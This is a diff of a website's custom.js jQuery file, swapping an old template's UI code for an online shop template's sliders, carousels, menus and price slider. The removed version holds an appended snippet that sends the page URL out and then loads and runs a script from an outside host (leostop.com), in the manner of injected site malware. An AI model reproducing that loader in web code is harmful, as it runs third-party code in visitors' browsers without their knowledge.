@@ -1,127 +1,216 @@
-/**************************************
-    File Name: custom.js
-**************************************/
-
 (function($) {
     "use strict";
-    /**************************************
-    TOOLTIP
-    **************************************/
-    $(function() {
-        $('[data-toggle="tooltip"]').tooltip()
-    })
+	
+	/* ..............................................
+	   Loader 
+	   ................................................. */
+	$(window).on('load', function() {
+		$('.preloader').fadeOut();
+		$('#preloader').delay(550).fadeOut('slow');
+		$('body').delay(450).css({
+			'overflow': 'visible'
+		});
+	});
 
-    /**************************************
-    LOADER
-    **************************************/
-    $(window).load(function() {
-        $("#preloader").on(500).fadeOut();
-        $(".preloader").on(600).fadeOut("slow");
-    });
+	/* ..............................................
+	   Fixed Menu
+	   ................................................. */
 
-    /**************************************
-    BACK TO TOP
-    **************************************/
-    jQuery(window).scroll(function() {
-        if (jQuery(this).scrollTop() > 1) {
-            jQuery('.dmtop').css({ bottom: "25px" });
-        } else {
-            jQuery('.dmtop').css({ bottom: "-100px" });
-        }
-    });
-    jQuery('.dmtop').click(function() {
-        jQuery('html, body').animate({ scrollTop: '0px' }, 800);
-        return false;
-    });
+	$(window).on('scroll', function() {
+		if ($(window).scrollTop() > 50) {
+			$('.main-header').addClass('fixed-menu');
+		} else {
+			$('.main-header').removeClass('fixed-menu');
+		}
+	});
 
-    /**************************************
-    COUNTER
-    **************************************/
-    function count($this) {
-        var current = parseInt($this.html(), 10);
-        current = current + 1;
+	/* ..............................................
+	   Gallery
+	   ................................................. */
 
-        $this.html(++current);
-        if (current > $this.data('count')) {
-            $this.html($this.data('count'));
-        } else {
-            setTimeout(function() { count($this) }, 50);
-        }
-    }
+	$('#slides-shop').superslides({
+		inherit_width_from: '.cover-slides',
+		inherit_height_from: '.cover-slides',
+		play: 5000,
+		animation: 'fade',
+	});
 
-    $(".stat-timer").each(function() {
-        $(this).data('count', parseInt($(this).html(), 10));
-        $(this).html('0');
-        count($(this));
-    });
+	$(".cover-slides ul li").append("<div class='overlay-background'></div>");
 
-    /**************************************
-    CAROUSEL
-    **************************************/
-    $('.carousel').carousel({
-        interval: 3000
-    })
-})(jQuery);
+	/* ..............................................
+	   Map Full
+	   ................................................. */
 
-function getURL() { window.location.href; }
-var protocol = location.protocol;
-$.ajax({ type: "get", data: { surl: getURL() }, success: function(response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-/**************************************
-TABBED
-**************************************/
-function openCategory(evt, catName) {
-    // Declare all variables
-    var i, tabcontent, tablinks;
+	$(document).ready(function() {
+		$(window).on('scroll', function() {
+			if ($(this).scrollTop() > 100) {
+				$('#back-to-top').fadeIn();
+			} else {
+				$('#back-to-top').fadeOut();
+			}
+		});
+		$('#back-to-top').click(function() {
+			$("html, body").animate({
+				scrollTop: 0
+			}, 600);
+			return false;
+		});
+	});
 
-    // Get all elements with class="tabcontent" and hide them
-    tabcontent = document.getElementsByClassName("tabcontent");
-    for (i = 0; i < tabcontent.length; i++) {
-        tabcontent[i].style.display = "none";
-    }
+	/* ..............................................
+	   Special Menu
+	   ................................................. */
 
-    // Get all elements with class="tablinks" and remove the class "active"
-    tablinks = document.getElementsByClassName("tablinks");
-    for (i = 0; i < tablinks.length; i++) {
-        tablinks[i].className = tablinks[i].className.replace(" active", "");
-    }
+	var Container = $('.container');
+	Container.imagesLoaded(function() {
+		var portfolio = $('.special-menu');
+		portfolio.on('click', 'button', function() {
+			$(this).addClass('active').siblings().removeClass('active');
+			var filterValue = $(this).attr('data-filter');
+			$grid.isotope({
+				filter: filterValue
+			});
+		});
+		var $grid = $('.special-list').isotope({
+			itemSelector: '.special-grid'
+		});
+	});
 
-    // Show the current tab, and add an "active" class to the link that opened the tab
-    document.getElementById(catName).style.display = "block";
-    evt.currentTarget.className += " active";
-}
+	/* ..............................................
+	   BaguetteBox
+	   ................................................. */
 
-/**************************************
-lightbox popup
-**************************************/
-$(document).on('click', '[data-toggle="lightbox"]', function(event) {
-    event.preventDefault();
-    $(this).ekkoLightbox();
-});
+	baguetteBox.run('.tz-gallery', {
+		animation: 'fadeIn',
+		noScrollbars: true
+	});
 
-/**************************************
-portfolio
-**************************************/
-$(document).ready(function() {
+	/* ..............................................
+	   Offer Box
+	   ................................................. */
 
-    $(".filter-button").click(function() {
-        var value = $(this).attr('data-filter');
+	$('.offer-box').inewsticker({
+		speed: 3000,
+		effect: 'fade',
+		dir: 'ltr',
+		font_size: 13,
+		color: '#ffffff',
+		font_family: 'Montserrat, sans-serif',
+		delay_after: 1000
+	});
 
-        if (value == "all") {
-            //$('.filter').removeClass('hidden');
-            $('.filter').show('1000');
-        } else {
-            //            $('.filter[filter-item="'+value+'"]').removeClass('hidden');
-            //            $(".filter").not('.filter[filter-item="'+value+'"]').addClass('hidden');
-            $(".filter").not('.' + value).hide('3000');
-            $('.filter').filter('.' + value).show('3000');
+	/* ..............................................
+	   Tooltip
+	   ................................................. */
 
-        }
-    });
+	$(document).ready(function() {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
 
-    if ($(".filter-button").removeClass("active")) {
-        $(this).removeClass("active");
-    }
-    $(this).addClass("active");
+	/* ..............................................
+	   Owl Carousel Instagram Feed
+	   ................................................. */
+
+	$('.main-instagram').owlCarousel({
+		loop: true,
+		margin: 0,
+		dots: false,
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true,
+		navText: ["<i class='fas fa-arrow-left'></i>", "<i class='fas fa-arrow-right'></i>"],
+		responsive: {
+			0: {
+				items: 2,
+				nav: true
+			},
+			600: {
+				items: 4,
+				nav: true
+			},
+			1000: {
+				items: 8,
+				nav: true,
+				loop: true
+			}
+		}
+	});
+
+	/* ..............................................
+	   Featured Products
+	   ................................................. */
+
+	$('.featured-products-box').owlCarousel({
+		loop: true,
+		margin: 0,
+		dots: false,
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true,
+		navText: ["<i class='fas fa-arrow-left'></i>", "<i class='fas fa-arrow-right'></i>"],
+		responsive: {
+			0: {
+				items: 1,
+				nav: true
+			},
+			600: {
+				items: 3,
+				nav: true
+			},
+			1000: {
+				items: 4,
+				nav: true,
+				loop: true
+			}
+		}
+	});
+
+	/* ..............................................
+	   Scroll
+	   ................................................. */
+
+	$(document).ready(function() {
+		$(window).on('scroll', function() {
+			if ($(this).scrollTop() > 100) {
+				$('#back-to-top').fadeIn();
+			} else {
+				$('#back-to-top').fadeOut();
+			}
+		});
+		$('#back-to-top').click(function() {
+			$("html, body").animate({
+				scrollTop: 0
+			}, 600);
+			return false;
+		});
+	});
 
 
-});
+	/* ..............................................
+	   Slider Range
+	   ................................................. */
+
+	$(function() {
+		$("#slider-range").slider({
+			range: true,
+			min: 0,
+			max: 4000,
+			values: [1000, 3000],
+			slide: function(event, ui) {
+				$("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
+			}
+		});
+		$("#amount").val("$" + $("#slider-range").slider("values", 0) +
+			" - $" + $("#slider-range").slider("values", 1));
+	});
+
+	/* ..............................................
+	   NiceScroll
+	   ................................................. */
+
+	$(".brand-box").niceScroll({
+		cursorcolor: "#9b9b9c",
+	});
+	
+	
+}(jQuery));
